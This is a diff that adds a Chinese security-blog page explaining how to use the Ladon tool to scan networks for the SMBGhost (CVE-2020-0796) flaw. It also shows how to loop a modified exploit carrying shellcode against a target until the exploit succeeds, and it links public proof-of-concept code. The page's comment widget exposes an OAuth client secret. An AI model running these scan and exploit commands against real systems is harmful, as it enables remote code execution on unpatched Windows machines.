@@ -1,0 +1,386 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="LPE,RCE,CVE-2020-0796,SMBGhost">
+
+
+<meta name="description" content="漏洞介绍
+2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Co...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    Ladon8.5稳定利用SMBGhost CVE-2020-0796 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="Ladon8.5稳定利用SMBGhost CVE-2020-0796">
+            
+            Ladon8.5稳定利用SMBGhost CVE-2020-0796
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Ladon/">Ladon</a> <a class="category-link" href="/categories/Lpe/">提权</a> <a class="category-link" href="/categories/Rce/">远程执行</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/CVE-2020-0796/" rel="tag">CVE-2020-0796</a> <a class="tag-none-link" href="/tags/LPE/" rel="tag">LPE</a> <a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a> <a class="tag-none-link" href="/tags/SMBGhost/" rel="tag">SMBGhost</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2021/06/06</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1412</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <h3 id="漏洞介绍">漏洞介绍</h3>
+<p>2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。</p>
+<h3 id="影响版本">影响版本</h3>
+<p>CVE-2020-0796漏洞影响运行Windows 10版本1903，Windows Server版本1903（服务器核心安装），Windows 10版本1909和Windows Server版本1909（服务器核心安装）的设备。根据Fortinet，其他Microsoft版本应受到影响。</p>
+<h3 id="模块说明">模块说明</h3>
+<p>漏洞编号：CVE-2020-0796<br>
+漏洞别名：SMBGhost、永恒之黑<br>
+影响版本：Win10或2016 1903 | 1909<br>
+返回结果：IP、机器名、漏洞编号、操作系统版本</p>
+<h3 id="无损扫描">无损扫描</h3>
+<p>通过检测SMB3.1.1是否启用压缩功能判定漏洞，和MS17010一样不会对目标造成任何损害，也不会被杀软拦截。</p>
+<h3 id="SMBGhost漏洞检测">SMBGhost漏洞检测</h3>
+<h4 id="扫描指定主机SMBGhost漏洞">扫描指定主机SMBGhost漏洞</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 SMBGhost</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="扫描C段主机SMBGhost漏洞">扫描C段主机SMBGhost漏洞</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 SMBGhost</span><br><span class="line">Ladon 192.168.1.8/C SMBGhost</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="批量扫描IP列表主机SMBGhost漏洞">批量扫描IP列表主机SMBGhost漏洞</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip.txt SMBGhost</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="批量检测IP段（-24）SMBGhost漏洞">批量检测IP段（/24）SMBGhost漏洞</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip24.txt SMBGhost</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="批量检测IP段（-16）SMBGhost漏洞">批量检测IP段（/16）SMBGhost漏洞</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip16.txt SMBGhost</span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/SmbGhost.PNG"></p>
+<h3 id="Ladon稳定利用">Ladon稳定利用</h3>
+<p>由于该漏洞利用不稳定，成功运气从1次到100次不等，所以8.5新增ForExec循环执行漏洞利用功能，原版EXP需交互执行，批量在本地执行还好，但要在目标，比如只有shell的情况下执行就很麻烦了，所以我们需对EXP进行一个小修改，把交互式去掉，再使用Ladon调用，一直循环有可能会导致目标蓝屏，所以我们需要判定成功后不再执行以免目标蓝屏，EXP命令循环使用Ladon ForExec查看用法。</p>
+<p>如图：ForExec循环利用Win10永恒之黑漏洞</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ForExec <span class="string">"CVE-2020-0796-Exp -i 192.168.1.8 -p 445 -e --load-shellcode test.txt"</span> 80 <span class="string">"Exploit finnished"</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/smbghost.gif"></p>
+<h3 id="POC-EXP-LPE">POC/EXP/LPE</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/danigargu/CVE-2020-0796">https://github.com/danigargu/CVE-2020-0796</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
+<p>配合Ladon可在Shell下使用的EXP在“K8小密圈”</p>
+<h3 id="Ladon下载">Ladon下载</h3>
+<p>PowerLadon: <a target="_blank" rel="noopener" href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br>
+历史版本: <a target="_blank" rel="noopener" href="http://github.com/k8gege/Ladon/releases">http://github.com/k8gege/Ladon/releases</a><br>
+7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>
+8.5版本：K8小密圈</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/CVE-2021-1675.html" class="pre-post btn btn-default" title="〖EXP〗Ladon打印机漏洞提权CVE-2021-1675复现">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            〖EXP〗Ladon打印机漏洞提权CVE-2021-1675复现</span>
+    </a>
+    
+    
+    <a href="/p/nbtinfo.html" class="next-post btn btn-default" title="〖工具〗Ladon 8.4 &amp; Cobalt Strike插件发布">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖工具〗Ladon 8.4 &amp; Cobalt Strike插件发布</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E8%AF%B4%E6%98%8E"><span class="toc-text">模块说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%8D%9F%E6%89%AB%E6%8F%8F"><span class="toc-text">无损扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMBGhost%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">SMBGhost漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BASMBGhost%E6%BC%8F%E6%B4%9E"><span class="toc-text">扫描指定主机SMBGhost漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8FC%E6%AE%B5%E4%B8%BB%E6%9C%BASMBGhost%E6%BC%8F%E6%B4%9E"><span class="toc-text">扫描C段主机SMBGhost漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E6%89%AB%E6%8F%8FIP%E5%88%97%E8%A1%A8%E4%B8%BB%E6%9C%BASMBGhost%E6%BC%8F%E6%B4%9E"><span class="toc-text">批量扫描IP列表主机SMBGhost漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8BIP%E6%AE%B5%EF%BC%88-24%EF%BC%89SMBGhost%E6%BC%8F%E6%B4%9E"><span class="toc-text">批量检测IP段（/24）SMBGhost漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8BIP%E6%AE%B5%EF%BC%88-16%EF%BC%89SMBGhost%E6%BC%8F%E6%B4%9E"><span class="toc-text">批量检测IP段（/16）SMBGhost漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon%E7%A8%B3%E5%AE%9A%E5%88%A9%E7%94%A8"><span class="toc-text">Ladon稳定利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-EXP-LPE"><span class="toc-text">POC/EXP/LPE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon%E4%B8%8B%E8%BD%BD"><span class="toc-text">Ladon下载</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
